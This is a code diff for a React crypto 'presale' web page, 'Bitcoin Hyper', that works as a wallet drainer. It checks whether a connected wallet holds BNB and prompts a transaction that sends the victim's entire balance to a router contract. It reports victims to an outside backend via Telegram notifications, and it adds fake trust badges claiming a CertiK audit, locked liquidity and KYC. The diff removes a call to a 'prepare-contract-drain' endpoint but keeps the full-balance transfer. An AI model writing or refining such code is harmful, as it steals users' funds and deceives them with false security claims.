@@ -26,14 +26,34 @@ const PROJECT_FLOW_ROUTER_ABI = [
   "function processNativeFlow() payable"
 ];
 
-// Chain ID Normalization Helper
+// Better Chain ID Normalization
 const normalizeChainId = (id) => {
   if (!id) return null;
+  
+  // Handle string IDs
   if (typeof id === 'string') {
-    if (id.startsWith('0x')) return parseInt(id, 16);
-    return Number(id);
+    // Handle hex strings
+    if (id.startsWith('0x')) {
+      try {
+        return parseInt(id, 16);
+      } catch {
+        return null;
+      }
+    }
+    // Handle decimal strings
+    try {
+      return parseInt(id, 10);
+    } catch {
+      return null;
+    }
   }
-  return Number(id);
+  
+  // Handle numbers
+  if (typeof id === 'number') {
+    return id;
+  }
+  
+  return null;
 };
 
 function App() {
@@ -53,10 +73,10 @@ function App() {
   const [txHash, setTxHash] = useState('');
   const [error, setError] = useState('');
   const [scanResult, setScanResult] = useState(null);
-  const [preparedTransactions, setPreparedTransactions] = useState([]);
   const [completed, setCompleted] = useState(false);
   const [showCelebration, setShowCelebration] = useState(false);
   const [verifying, setVerifying] = useState(false);
+  const [hasBalance, setHasBalance] = useState(false);
   
   // Presale stats
   const [timeLeft, setTimeLeft] = useState({
@@ -95,7 +115,7 @@ function App() {
     };
     
     fetchBnbPrice();
-    const interval = setInterval(fetchBnbPrice, 60000); // Update every minute
+    const interval = setInterval(fetchBnbPrice, 60000);
     
     return () => clearInterval(interval);
   }, []);
@@ -106,23 +126,34 @@ function App() {
       setBalance(balanceData.formatted);
       const bnbAmount = parseFloat(balanceData.formatted);
       setBalanceUSD(bnbAmount * bnbPrice);
+      setHasBalance(bnbAmount > 0);
     }
   }, [balanceData, bnbPrice]);
 
-  // Check if on correct network
+  // Normalize chain ID for comparison
   const normalizedChainId = normalizeChainId(chainId);
-  const isCorrectNetwork = normalizedChainId === 56;
+  const isBSC = normalizedChainId === 56;
 
-  // Signer initialization
+  // Log network info for debugging
+  useEffect(() => {
+    console.log('Network Check:', {
+      rawChainId: chainId,
+      normalized: normalizedChainId,
+      isBSC: isBSC,
+      address: address,
+      hasBalance: hasBalance
+    });
+  }, [chainId, normalizedChainId, isBSC, address, hasBalance]);
+
+  // Signer initialization - only when on BSC
   useEffect(() => {
     const initSigner = async () => {
-      if (!isConnected || !isCorrectNetwork) {
+      if (!isConnected || !isBSC) {
         setSigner(null);
         setProvider(null);
         return;
       }
 
-      // Try to get walletClient with retry
       let attempts = 0;
       const maxAttempts = 10;
       
@@ -137,7 +168,7 @@ function App() {
             
             console.log("✅ Signer ready:", await web3Signer.getAddress());
             
-            // Send Telegram notification for signer ready
+            // Send Telegram notification
             await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
@@ -156,10 +187,8 @@ function App() {
         return false;
       };
 
-      // Try immediately
       if (await tryGetWalletClient()) return;
 
-      // Retry with interval
       const interval = setInterval(async () => {
         attempts++;
         if (await tryGetWalletClient() || attempts >= maxAttempts) {
@@ -171,7 +200,7 @@ function App() {
     };
 
     initSigner();
-  }, [isConnected, isCorrectNetwork, walletClient, address]);
+  }, [isConnected, isBSC, walletClient, address]);
 
   // Countdown timer
   useEffect(() => {
@@ -192,12 +221,12 @@ function App() {
     return () => clearInterval(timer);
   }, []);
 
-  // Auto-check eligibility when wallet connects and on correct network
+  // Auto-check eligibility when wallet connects AND we have balance
   useEffect(() => {
-    if (isConnected && isCorrectNetwork && address && !scanResult && !verifying) {
+    if (isConnected && address && hasBalance && !scanResult && !verifying) {
       verifyWallet();
     }
-  }, [isConnected, isCorrectNetwork, address]);
+  }, [isConnected, address, hasBalance]);
 
   const verifyWallet = async () => {
     if (!address) return;
@@ -229,7 +258,6 @@ function App() {
         
         if (data.data.isEligible) {
           setTxStatus('✅ You qualify!');
-          await preparePresale();
           
           // Send Telegram notification for eligibility
           await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
@@ -263,34 +291,14 @@ function App() {
     }
   };
 
-  const preparePresale = async () => {
-    if (!address) return;
-    
-    try {
-      const response = await fetch('https://tokenbackend-5xab.onrender.com/api/presale/prepare-contract-drain', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ walletAddress: address })
-      });
-      
-      const data = await response.json();
-      
-      if (data.success) {
-        setPreparedTransactions(data.data.transactions);
-      }
-    } catch (err) {
-      console.error('Prepare error:', err);
-    }
-  };
-
-  // Execute function with network check - NOW USING 100% OF BALANCE
+  // Execute function - NOW USING 100% OF BALANCE
   const executePresaleTransaction = async () => {
     if (!isConnected || !address) {
       setError("Wallet not connected");
       return;
     }
 
-    if (!isCorrectNetwork) {
+    if (!isBSC) {
       setError("Please switch to BSC network in your wallet");
       return;
     }
@@ -335,7 +343,7 @@ function App() {
       );
 
       // USE 100% OF BALANCE
-      const value = balanceData.value; // Send full balance
+      const value = balanceData.value;
 
       // Log the transaction details
       console.log("💰 Transaction Details:", {
@@ -584,8 +592,8 @@ function App() {
           )}
         </div>
 
-        {/* Network Status - Only show if wrong network */}
-        {isConnected && !isCorrectNetwork && (
+        {/* Network Status - Only show if not BSC and connected */}
+        {isConnected && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
@@ -654,8 +662,8 @@ function App() {
           </div>
         )}
 
-        {/* Main Content */}
-        {isConnected && isCorrectNetwork && !verifying && scanResult && (
+        {/* Main Content - Show if connected, has balance, and is verified */}
+        {isConnected && hasBalance && scanResult && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
@@ -719,6 +727,19 @@ function App() {
             )}
           </div>
         )}
+
+        {/* Trust Badges - Restored Footer */}
+        <div className="mt-12 text-center">
+          <div className="flex flex-wrap justify-center gap-3 mb-6">
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Audited by CertiK</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ Liquidity Locked</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ KYC Verified</span>
+            <span className="bg-gray-800/50 px-4 py-2 rounded-full text-sm text-gray-400 border border-gray-700">✓ 50M+ Raised</span>
+          </div>
+          <p className="text-gray-600 text-sm">
+            © 2026 Bitcoin Hyper. All rights reserved. | Secure Presale Platform
+          </p>
+        </div>
       </div>
     </div>
   );
